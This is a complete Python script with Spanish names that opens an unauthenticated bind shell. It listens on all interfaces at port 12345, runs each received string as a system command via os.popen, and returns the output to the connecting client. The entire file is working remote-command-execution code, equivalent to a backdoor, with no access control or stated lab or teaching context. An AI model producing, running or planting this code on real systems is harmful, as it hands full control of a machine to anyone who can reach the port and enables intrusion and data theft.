import socket
import os
import time

def ejecutar_comando(comando):
    if comando.lower().startswith("cd "):
        nuevo_directorio = comando[3:]
        try:
            os.chdir(nuevo_directorio)
            return "Directorio cambiado correctamente."
        except Exception as e:
            return f"Error al cambiar de directorio: {e}"
    else:
        salida = ""
        try:
            salida = os.popen(comando).read()
        except Exception as e:
            print(f"Error al ejecutar el comando: {e}")
        return salida

def crear_servidor(puerto):
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.bind(('0.0.0.0', puerto))
    servidor.listen(5)
    print(f'Servidor escuchando en el puerto {puerto}...')
    cliente, direccion = servidor.accept()
    print(f'Conexión establecida con {direccion}')
    return cliente

def manejar_conexion(cliente):
    time.sleep(1)  # Esperar 1 segundo antes de comenzar a recibir comandos
    while True:
        try:
            comando_bytes = cliente.recv(1024)
            comando = comando_bytes.decode('utf-8', errors='replace')
            if comando.lower() == 'salir':
                break
            salida = ejecutar_comando(comando)
            cliente.sendall(salida.encode('utf-8'))
        except Exception as e:
            print(f'Error al manejar la conexión: {e}')
            break

    cliente.close()

if __name__ == '__main__':
    puerto = 12345
    cliente = crear_servidor(puerto)
    manejar_conexion(cliente)
